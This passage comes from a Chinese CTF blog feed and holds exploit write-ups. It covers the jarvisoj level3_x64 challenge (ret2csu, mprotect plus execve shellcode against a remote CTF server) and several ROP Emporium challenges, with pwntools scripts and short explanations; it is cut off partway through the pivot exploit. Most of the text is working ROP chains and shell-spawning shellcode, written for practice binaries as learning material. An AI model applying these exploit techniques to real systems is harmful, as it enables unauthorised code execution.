class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">sh=remote(<span class="string">'pwn2.jarvisoj.com'</span>,9884)</span><br><span class="line"><span class="comment">#sh = process('./level3_x64')</span></span><br><span class="line">elf =ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">vul = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"><span class="comment">#read_plt = elf.symbols['read']</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_libc = libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">mprotect_libc = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="comment">#write_plt = elf.plt['write']</span></span><br><span class="line"><span class="comment">#bss = 0x0600A88</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop5_addr = 0x04006A6</span><br><span class="line">mov_call = 0x0400690    </span><br><span class="line"></span><br><span class="line">bss_got = 0x0600A48</span><br><span class="line">mprotect_got = 0x0600A50</span><br><span class="line"></span><br><span class="line">def csu(r12,r13,r14,r15,data=False):</span><br><span class="line">data_num=<span class="string">''</span></span><br><span class="line">payload = <span class="string">"a"</span>*0x88</span><br><span class="line">payload += p64(pop5_addr)+p64(0)+p64(0)+p64(1)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">payload += p64(mov_call)+<span class="string">"a"</span>*0x38</span><br><span class="line">payload += p64(vul)</span><br><span class="line">sh.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="keyword">if</span> data==True:</span><br><span class="line">data_num = u64(sh.recv(8))</span><br><span class="line"><span class="built_in">return</span> data_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_addr = csu(write_got,8,read_got,1,True)</span><br><span class="line">mprotect_addr = read_addr - read_libc + mprotect_libc</span><br><span class="line"><span class="built_in">print</span> <span class="string">"mprotect_addr:"</span> + hex(mprotect_addr)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">csu(read_got,len(shellcode),bss,0)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">mprotect_got = 0x0600A50</span><br><span class="line">csu(read_got,8,mprotect_got,0)</span><br><span class="line">sh.send(p64(mprotect_addr))</span><br><span class="line">csu(mprotect_got,7,0x1000,0x600000)</span><br><span class="line">bss_got = 0x0600A48</span><br><span class="line">csu(read_got,8,bss_got,0)</span><br><span class="line">sh.send(p64(bss))</span><br><span class="line">csu(bss_got,0,0,0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>第二种（用pop rdi，rsi，rdx来存参）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh =remote(<span class="string">'pwn2.jarvisoj.com'</span>,9884)</span><br><span class="line"><span class="comment">#sh = process('./level3_x64')</span></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_plt = 0x04004B0</span></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vul = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="comment">#bss = 0x0600A88</span></span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">mprotect_libc = libc.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line">pop5_addr = 0x00000000004006A6</span><br><span class="line">mov_call = 0x0000000000400690     <span class="comment">#distence 0x1a</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload1 += p64(pop_rdi)+p64(1)+p64(pop_rsi_rdx)+p64(write_got)+p64(0)+p64(write_plt)+p64(vul)</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">data = sh.recv(8)</span><br><span class="line">write_addr = u64(data)</span><br><span class="line"></span><br><span class="line">libc_dis = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">mprotect_addr = libc_dis + libc.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">payload2 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload2 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_base)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">bss_got = 0x0000000000600A48</span><br><span class="line">payload4 = <span class="string">"a"</span>*0x80 + p64(0)</span><br><span class="line">payload4 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_got)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload4)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(p64(bss_base)) </span><br><span class="line"></span><br><span class="line">mprotect_got = 0x0000000000600A50</span><br><span class="line">payload3 = <span class="string">"a"</span>*0x80 +p64(0)</span><br><span class="line">payload3 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(mprotect_got)+p64(0)+p64(read_plt)+p64(vul)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload3)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(p64(mprotect_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004006b3 <span class="comment">#the first parameter</span></span><br><span class="line">pop_rsi_rdx = 0x00000000004006b1 <span class="comment">#the second and third </span></span><br><span class="line"></span><br><span class="line">payload5 = <span class="string">'a'</span>*0x80+p64(0)</span><br><span class="line">payload5 += p64(pop5_addr) + p64(0) + p64(0) + p64(1) +p64(mprotect_got) + p64(7) +p64(0x1000)+p64(0x600000)</span><br><span class="line">payload5 +=p64(mov_call) </span><br><span class="line">payload5 += <span class="string">'a'</span>*8 + p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)</span><br><span class="line">payload5 += p64(mov_call)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload5)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure><h1 id="权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限"><a href="#权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限" class="headerlink" title="权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限"></a>权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限</h1><p>找了一下午的bug，代码改得有点乱（终于cat到flag也是好心酸的）。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;libc-csu&quot;&gt;&lt;a href=&quot;#libc-csu&quot; class=&quot;headerlink&quot; title=&quot;_libc_csu&quot;&gt;&lt;/a&gt;&lt;em&gt;_libc_csu&lt;/em&gt;&lt;/h2&gt;&lt;p&gt;1、Ret2csu&lt;/p&gt;
&lt;p&gt;这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。&lt;br&gt;Emmm真是一个异常简洁的main函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%871.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;我们发现它有个pwnme函数哦，那就点进去看一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%872.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/07/08/libc-csu/%E5%9B%BE%E7%89%873.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ROP Emporium</title>
    <link href="http://yoursite.com/2019/07/08/ROP%20Emporium/"/>
    <id>http://yoursite.com/2019/07/08/ROP Emporium/</id>
    <published>2019-07-08T04:12:19.000Z</published>
    <updated>2019-07-08T15:11:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。</p><h2 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1-ret2win"></a>1-ret2win</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2win'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=0x0400824</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">payload = 0x20*<span class="string">"a"</span> + p64(0) + p64(shell)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="2-split"><a href="#2-split" class="headerlink" title="2-split"></a>2-split</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./split'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">cat_flag = 0x0601060</span><br><span class="line">bss = 0x0601080</span><br><span class="line">pop_rdi = 0x0400883</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0) + p64(pop_rdi) + p64(cat_flag) + p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-callme"><a href="#3-callme" class="headerlink" title="3-callme"></a>3-callme</h2><p>题目意思大概是叫我们分别调用callme_one callme_two callme_three来得到flag，要想知道这些函数到底是干什么的还是要去.so文件里看一下具体的函数（其实主要是它竟然给了我们一个.so文件，那肯定不会没用啊，而且callme里对这三个函数就是一笔带过，啥都没写）</p><p>so里的三个函数传的参都是1、2、3，意思就是我们要把这些参数压进栈内，然后调用callme的三个函数，但是貌似每次调用都要传参，才能调用到下一个函数，所以我们要pop三个寄存器出来存着三个数</p><p><img src="/2019/07/08/ROP Emporium/callme_pop.jpg" alt></p><p>然后找到rdi rsi rdx三个可以用的<br>接下来上脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./callme'</span>)</span><br><span class="line"></span><br><span class="line">callme_one = 0x0401850</span><br><span class="line">callme_two = 0x0401870</span><br><span class="line">callme_three = 0x0401810</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx = 0x0401ab0 <span class="comment">#wirte 1/2/3 in callme</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_one)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_two)</span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_three)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>32位不需要调用rdi来存放指令，但是它需要用到堆栈平衡，在调用函数之后的栈帧里，存的是它的返回地址，而后面是调用函数的参数。（这里就没写exp）<br>但64位需要用到rdi，rsi，rdx来存参，参数在调用前进栈，存入相应位置。</p><h2 id="4-write4"><a href="#4-write4" class="headerlink" title="4-write4"></a>4-write4</h2><p>首先，我们明确一下思路，是要将”/bin/sh”写入bss段里。<br>借助pop</p><p><img src="/2019/07/08/ROP Emporium/write4_pop1.jpg" alt></p><p>然后我们选那个r14、r15的地址<br>然后还要去找mov的地址来给寄存器赋值的</p><p><img src="/2019/07/08/ROP Emporium/write4_pop2.jpg" alt></p><p>然后我们找到有r14和r15的，[r14]是代表r14的地址，r15则是对应的值，假设r14地址为0x0401809，r15里的值是“abc”，则这个命令就是，让r14里的地址指向r15里的内容，即0x0401809-&gt;“abc”。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./write4'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">pop_rdi = 0x0400893 </span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">pop_r14_r15 = 0x0400890 </span><br><span class="line">mov_r14_r15 = 0x0400820 </span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20+p64(0)</span><br><span class="line">payload += p64(pop_r14_r15) + p64(bss) + <span class="string">"/bin/sh\x00"</span> + p64(mov_r14_r15) <span class="comment">#save the /bin/sh into bss</span></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system) <span class="comment">#rdi-&gt;system   bss is the x in system</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5-badchars"></a>5-badchars</h2><p>通过程序我们知道，它阻止了几个字符的输入，使个别字符强行转换成21（会影响“/bin/sh”的写入），所以我们要绕过它</p><p><img src="/2019/07/08/ROP Emporium/badchars_bad.jpg" alt></p><p>最简单的加密解密方法就是异或了，我们来找一个数字，使输入异或之后不等于badchars即可，脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line">chars = [98,105,99,47,32,102,110,115]</span><br><span class="line">num = 1</span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"><span class="keyword">while</span> 1:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> binsh:</span><br><span class="line">x = ord(i) ^ num  </span><br><span class="line"><span class="keyword">if</span> x <span class="keyword">in</span> chars:</span><br><span class="line">num += 1</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i == <span class="string">"\x00"</span>:</span><br><span class="line"><span class="built_in">print</span> num</span><br><span class="line">num += 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> num == 10:</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>我们选用2<br>然后我们就可以写exp了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">'./badchars'</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">num = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> binsh:</span><br><span class="line">num += chr(ord(x)^2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = 0x04006F0 </span><br><span class="line">bss = 0x0601080 </span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0400b39 </span><br><span class="line">mov_r12_r13 = 0x0400b34  </span><br><span class="line">pop_r12_r13 = 0x0400b3b  </span><br><span class="line"><span class="comment">#write num in bss</span></span><br><span class="line"></span><br><span class="line">pop_r14_r15 = 0x0400b40</span><br><span class="line">xor_r15_r14 = 0x0400b30 <span class="comment">#back to binsh</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * 0x20 + p64(0)</span><br><span class="line">payload += p64(pop_r12_r13) + num + p64(bss) + p64(mov_r12_r13)</span><br><span class="line"></span><br><span class="line"><span class="comment">#back to binsh</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(num)):</span><br><span class="line">payload += p64(pop_r14_r15) + p64(2) + p64(bss+i)</span><br><span class="line">payload += p64(xor_r15_r14)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="6-fluff"><a href="#6-fluff" class="headerlink" title="6-fluff"></a>6-fluff</h2><p>这个和前面的write4有异曲同工之处，只不过这个程序没有那么多的mov，需要借助到xor（xor自身会清空，xor另一个数，就等于存值）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./fluff'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x04008c3 </span><br><span class="line">pop_r12 = 0x04008bc</span><br><span class="line"><span class="comment">#pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"></span><br><span class="line">xor_r11_r11 = 0x0400822</span><br><span class="line"><span class="comment"># xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret</span></span><br><span class="line">xor_r11_r12 = 0x040082f</span><br><span class="line"><span class="comment"># xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret</span></span><br><span class="line">xchg_r11_r10 = 0x0400840</span><br><span class="line"><span class="comment"># xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret</span></span><br><span class="line">mov_r10_r11 = 0x040084e</span><br><span class="line"><span class="comment"># mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop_r12) + p64(bss) + p64(0) + p64(0) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r11) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r12) + p64(0)</span><br><span class="line">payload += p64(xchg_r11_r10) + p64(0) </span><br><span class="line">payload += p64(pop_r12) + <span class="string">"/bin/sh\x00"</span>+ p64(0) + p64(0) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r11) + p64(0)</span><br><span class="line">payload += p64(xor_r11_r12) + p64(0) </span><br><span class="line">payload += p64(mov_r10_r11) + p64(0) + p64(0) </span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7-pivot"></a>7-pivot</h2><p>这个貌似有用到栈迁移的东西，这个程序有两个输入，第一个是写到堆里（它给出了堆的地址），第二个是写入到栈里。很明显第二次能输入的内容太少，所以payload写入堆里，然后在栈里调用。</p><p>.so里有一个后门函数，可以直接调用ret2win，cat到flag。而要leak真实地址的话要找两个文件都有的函数，貌似是只有foothold_function函数#函数需要经过一次调用之后got表里才会有真实地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pivot'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libpivot.so'</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_so = libc.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">ret2win = libc.symbols[<span class="string">'ret2win'</span>]</span><br><span class="line"></span><br><span class="line">foothold_function_plt = 0x0400850</span><br><span class="line">foothold_function_got = 0x0602048</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offest = ret2win - foothold_function_so</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop_rax = 0x0400b00</span><br><span class="line">mov_rax_addr = 